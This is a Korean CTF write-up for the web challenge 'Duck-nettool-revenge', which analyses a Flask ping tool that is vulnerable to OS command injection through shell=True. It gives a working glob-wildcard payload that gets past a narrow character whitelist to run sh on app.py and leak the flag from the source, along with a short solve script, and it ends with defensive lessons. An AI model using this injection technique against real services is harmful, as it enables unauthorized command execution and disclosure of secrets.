---
ctf_name: "v1t CTF 2026"
challenge_name: "Duck-nettool-revenge"
category: "web"
difficulty: "medium"
author: "yeahhbean"
date: "2026-06-27"
points: 100
tags:
  [
    Command Injection,
    RCE,
    glob,
    wildcard bypass,
    filter bypass,
    source disclosure,
    shell quoting,
    Flask,
    Docker hardening,
  ]
---

# Duck-nettool-revenge

## 문제 설명

> ✨ DUCK NETTOOL REVENGE ✨ — 호스트를 입력하면 `ping`을 대신 실행해 주는 Flask 웹 도구.
> 이전 `Duck-nettool`이 unintended로 너무 쉽게 풀려서 필터·환경을 조여 재출제한 **revenge** 버전.

- 100 points / web
- Remote: `https://api.v1t.site` — web 폼에 **Cloudflare captcha** 존재(원격 자동 fuzz 불가) → 로컬에서 익스 개발 후 브라우저로 발사
- 출제자 공지: _"On remote it will replace all `v1t{fake_flag}` with real flag. **Flag on the source code.**"_
  → 진짜 플래그는 소스에 박힌 `v1t{fake_flag}` 토큰이 배포 시 치환되어 들어간다. **"어느 소스 파일을 읽을 수 있는가"** 가 관건.
- 첨부: `app.py`, `Dockerfile`, `docker-compose.yml`, `flag.py`, `flag.txt`, `requirements.txt`, `templates/index.html`

## 풀이

### 분석

핵심 라우트:

```python
ALLOWED_TARGET_RE = re.compile(r"^(?!.* \.)(?!.*\. )[i0-9.;?/ ]+$")
...
command = f"ping -c 1 {target}"
output = subprocess.check_output(command, shell=True,
                                 stderr=subprocess.STDOUT,   # stderr 합쳐서 반환
                                 timeout=5, text=True,
                                 env={"PATH": "/bin:/usr/bin"})
```

`target`이 `shell=True` 명령 문자열에 그대로 들어가므로 **OS Command Injection**. 방어가 여러 겹이다.

**(1) 입력 화이트리스트 정규식** `^(?!.* \.)(?!.*\. )[i0-9.;?/ ]+$`

- 허용 문자: **`i`, `0-9`, `.`, `;`, `?`, `/`, 공백** 뿐 (알파벳은 `i` 하나)
- `" ."`/`". "` 금지 → 셸 `source`/`.` 빌트인 트릭 차단
- 결론: `cat`/`sh`/`python`/`ping` 같은 **이름을 글자로 타이핑 불가.** 단 `;`(명령 분리), `?`(단일 문자 글롭), `/`(경로)는 살아 있다.

**(2) BLOCKED_TOKENS** — base64 두 개. 디코드하면 `"goodbye uit i'm about to graduate"`, `"...play sekai i have no chance ;-;"` 농담. 애초에 허용 문자셋을 못 통과하므로 **순수 레드헤링**.

**(3) Dockerfile 하드닝**

- non-root `ctf` 유저로 `gunicorn` 실행, compose는 `read_only` rootfs / `cap_drop: ALL` / 리소스 제한
- `/bin`·`/usr/bin`·`/usr/local/bin`에서 화이트리스트 외 바이너리 **전부 삭제** → 남는 건 `sh`, `ping`, `python`/`python3`/`python3.11`, `gunicorn`. (`cat`/`ls`/`bash`/`curl` 없음)

**(4) 어디에 진짜 플래그가 있나 — 토큰 추적**

`v1t{fake_flag}` 문자열이 들어있는 컨테이너 파일을 찾으면 치환 후 진짜 플래그가 어디 생기는지 알 수 있다.

| 파일         | 권한 (remote)                  | `v1t{fake_flag}` 포함?         | 읽기/실행 결과                                 |
| ------------ | ------------------------------ | ------------------------------ | ---------------------------------------------- |
| `flag.txt`   | `root:root 0000`               | O                              | `ctf`가 못 읽음 → **Permission denied (함정)** |
| `flag.py`    | `0444`, `print('FLAG')`        | **X**                          | 실행해도 `FLAG`만 출력 → **치환 안 됨 (함정)** |
| `/app/init`  | `0555`, flag.txt의 sha256 echo | X                              | 해시만 줌, "not brute-forceable" → **함정**    |
| **`app.py`** | **`ctf:ctf 0644`**             | **O** (`app.py:10` 도크스트링) | **읽기 가능 → 치환된 진짜 플래그가 여기 있음** |

> `app.py` 상단 docstring에 `"- The SHA-256 hash of v1t{fake_flag} is not realistically brute-forceable,"` 줄이 있다. 배포 시 `sed`가 이 토큰을 실제 플래그로 바꾸므로, **읽을 수 있는 소스 `app.py`가 곧 플래그 보관소.** 출제자의 "Flag on the source code"가 이걸 가리킨다.

### 취약점

`subprocess.check_output(f"ping -c 1 {target}", shell=True)` 의 명령어 인젝션. 짧은 화이트리스트라도 **`;`(분리)와 `?`(글롭)** 가 남아 임의 명령 실행이 된다. revenge는 `*`를 막아 단일 문자 `?`만 → 길이를 정확히 맞춰야 한다.

### 익스플로잇

목표: `app.py`의 **소스를 그대로 출력**시켜 docstring 속 플래그를 본다.

`cat`이 없고, `app.py`는 **유효한 파이썬**이라 `python3 app.py`는 그냥 Flask 서버를 띄우고 멈춘다(타임아웃). `SyntaxError` echo 트릭도 안 통한다. 대신 **`sh`에게 `app.py`를 스크립트로 던진다.**

`app.py` 첫 토큰은 모듈 docstring `"""..."""`. `sh`는 이를 **하나의 거대한 따옴표 문자열**로 파싱하고, 그 전체를 명령으로 실행하려다 실패하며 **`not found` 에러에 토큰 내용을 통째로 echo**한다 → docstring 안의 플래그 라인이 노출된다. 앱이 `stderr`를 합쳐 반환하므로 그대로 회수된다.

```
$ sh /app/app.py
/app/app.py: 12:
TODO / Deployment fixes
...
- The SHA-256 hash of v1t{...real flag...} is not realistically brute-forceable,
...
: not found
/app/app.py: 13: import: not found
...
```

**글롭 철자 (길이 정밀 매칭 + 충돌 회피)**

1. `/usr/bin/sh` = `usr`(3)/`bin`(3)/`sh`(2). `bin`의 가운데 글자 `i`(허용 문자)를 고정해 충돌을 줄인다:

   ```
   /???/?i?/??     → /usr/bin/sh   (유일 매칭)
   ```

   (`/bin/sh`를 노린 `/???/??`도 가능하나, 정밀도가 떨어진다.)

2. `/app/app.py` = `app`(3)/`app.py`(`???.??` = app3 + `.` + py2):

   ```
   /???/???.??     → /app/app.py   (유일 매칭; flag.py는 ????.??, flag.txt는 ????.??? 라 탈락)
   ```

**최종 페이로드 (`target`)**

```
127.0.0.1;/???/?i?/?? /???/???.??
```

서버 실행:

```
ping -c 1 127.0.0.1;/usr/bin/sh /app/app.py
```

> **ping 타임아웃 함정.** 앱은 `timeout=5`. 인젝션 명령은 `;` 뒤라 **앞의 ping이 먼저 끝나야** 실행된다. 리딩 타깃을 `1`(=`0.0.0.1`, 도달 불가)로 두면 ping이 응답을 기다리며 5초를 넘겨 프로세스가 죽고 → `"Command timed out"`만 돌아온다. **즉시 응답하는 루프백 `127.0.0.1`**(또는 `0`)을 써서 ping을 곧장 끝내야 `sh`가 실행된다.

정규식 통과 확인: 사용 문자는 `1 2 7 0 . ; / ? 공백 i`로 전부 허용 집합이고 `" ."`·`". "` 조합 없음.

```python
# solve.py (요약)
import requests, re, sys
URL = sys.argv[1] if len(sys.argv) > 1 else "https://api.v1t.site/"
payload = "127.0.0.1;/???/?i?/?? /???/???.??"   # ping 127.0.0.1 ; sh /app/app.py
r = requests.post(URL, data={"target": payload}, timeout=15)
out = re.search(r"<pre>(.*?)</pre>", r.text, re.S).group(1)
print(re.search(r"v1t\{.*?\}", out).group(0))
```

> 검증: 컨테이너 파일시스템을 충실히 재현하고 `glob(root_dir=...)`로 글롭이 정확히 `/usr/bin/sh /app/app.py`로만 해석됨을 확인. 토큰을 치환한(=remote) `app.py`에 대해 전체 체인(정규식 통과 → `;` 분리 → 글롭 해석 → `sh app.py` → docstring echo)이 플래그를 노출함을 확인했고, 실제 remote(`api.v1t.site`)에서도 동일 페이로드로 플래그를 회수했다.

## 플래그

```
v1t{REDACTED}
```

## 배운 점

- **짧은 화이트리스트 ≠ 안전.** 글자를 `i` 하나로 줄여도 `;` + `?` + `/`만 남으면 RCE다. 호스트 입력 검증에서 셸 메타문자(`;`, `|`, `&`, `` ` ``, `$()`)와 글롭 문자(`*`, `?`, `[`)는 반드시 차단해야 한다. 근본 해결은 `shell=True` 제거 + 인자 배열(`subprocess.run(["ping","-c","1",target])`) + 입력 형식 엄격 검증.
- **"실행"만 막지 말고 "소스 노출"도 막아라.** 플래그가 데이터 파일(`flag.txt`, 권한으로 보호)에만 있다고 믿었지만, 실제로는 **읽을 수 있는 소스(`app.py`)의 주석/문자열**에 같은 토큰이 박혀 있었다. 시크릿을 소스/주석/docstring에 절대 두지 말 것. 치환 스크립트가 의도치 않게 시크릿을 읽기 가능한 파일로 복제했다.
- **인터프리터·셸은 곧 파일 읽기 도구.** `cat`을 지워도 `python3 <비파이썬파일>`의 `SyntaxError`, `sh <파이썬파일>`의 따옴표 파싱 `not found` 에러가 소스 라인을 누출한다. **에러 메시지를 사용자에게 그대로 반환하지 말 것**(stderr 노출 = 정보 노출).
- **함정 식별이 풀이의 절반.** `flag.txt`(권한)·`flag.py`(미치환)·`init`(해시) 세 미끼를 권한·내용·배포 공지로 걸러내야 진짜 경로(읽을 수 있는 `app.py`)가 보인다. "치환 대상 토큰이 실제로 어느 readable 파일에 있는가"를 먼저 추적하는 게 핵심.
- **허용 문자가 익스를 정밀하게 만든다.** `i`를 허용한 탓에 `bin`을 `?i?`로 고정해 글롭 충돌을 제거했다. 그리고 `timeout=5` + `;` 순차 실행 구조 때문에 **선행 `ping`을 루프백으로 즉시 끝내는** 디테일까지 맞춰야 비로소 페이로드가 동작한다.
